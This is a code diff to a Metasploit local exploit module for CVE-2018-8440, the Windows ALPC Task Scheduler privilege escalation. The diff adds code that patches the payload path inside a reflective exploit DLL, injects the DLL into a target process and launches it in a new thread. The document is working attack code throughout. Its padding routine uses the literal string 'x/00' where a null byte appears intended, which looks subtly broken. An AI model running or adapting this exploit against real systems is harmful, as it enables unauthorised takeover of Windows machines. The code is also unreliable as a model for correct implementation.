+++ modules/exploits/windows/local/alpc_taskscheduler.rb
@@ -81,30 +81,41 @@ class MetasploitModule < Msf::Exploit::Local
     @temp_path = datastore['PATH'] || session.sys.config.getenv('TEMP')
     @payload_path = "#{temp_path}\\#{payload_name}"
     @payload_dll = generate_payload_dll
+    @original_path = ('A' * 80) + '.dll'
+  end
+
+  def overwrite_payload_path(exploit_data, payload_path, original_path)
+    # The payload path is hard-coded into the exploit
+    # We need to change it, but the exploit binary is in UTF-16LE
+    # But our parsers (right now) expect it to be encoded as ANSI-8bit
+    # Covert the exploit binary to UTF-16, switch the values, then return
+    # the encoding to whatever it was to begin with
+    print_status("Attempting to change the payload path to #{payload_path}...")
+    print_status("payload path length = #{payload_path.length}...")
+    print_status("original path length = #{original_path.length}...")
+    if payload_path.length > original_path.length
+      fail_with(Failure::BadConfig,"Parameter PAYLOAD_NAME may not exceed #{original_path.length} characters, including extension")
+    end
+    original_encoding = exploit_data.encoding
+    exploit_data.force_encoding("UTF-16LE")
+    padded_path = payload_path + ('x/00' * ((original_path.length)-(payload_path.length)))
+    padded_path.encode!("UTF-16LE")
+    original_path.encode!("UTF-16LE")
+    exploit_data.force_encoding("UTF-16LE")
+    exploit_data.sub!(original_path, padded_path)
+    exploit_data.force_encoding(original_encoding)
   end
 
   def inject_magic(process)
-    library_path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2018-8440', 'ALPC-TaskSched-LPE.dll')
+    library_path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2018-8440', 'reflective_dll.x64.dll')
     library_path = ::File.expand_path(library_path)
-
+    dll_data = ''
+    ::File.open(library_path, 'rb') { |f| dll_data = f.read }
+    overwrite_payload_path(dll_data, payload_path, original_path)
     print_status("Reflectively injecting the exploit DLL into #{process.pid}...")
-    dll = ''
-    ::File.open(library_path, 'rb') { |f| dll = f.read }
+    exploit_mem, offset = inject_dll_data_into_process(process, dll_data)
+    process.thread.create(exploit_mem + offset)
 
-    require 'pry'
-    binding.pry
-
-    if @payload_name.length > 20
-      fail_with(Failure::BadConfig,"Parameter PAYLOAD_NAME may not exceed 20 characters, including extension")
-    end
-    padded_payload_name = @payload_name + ( '\x00' * (20 - @payload_name.length) )
-
-    #old_encoding = dll.encoding
-    #dll.force_encoding('utf-16le')
-    #dll.sub!("AAAAAAAAAAAAAAAA.dll".encode('utf-16le'), @payload_name.encode('utf-16le'))
-    #dll.force_encoding(old_encoding)
-
-    exploit_mem, offset = inject_dll_data_into_process(process, dll)
   end
 
   def validate_active_host
@@ -181,4 +192,5 @@ class MetasploitModule < Msf::Exploit::Local
   attr_reader :payload_dll
   attr_reader :temp_path
   attr_reader :payload_path
+  attr_reader :original_path
 end
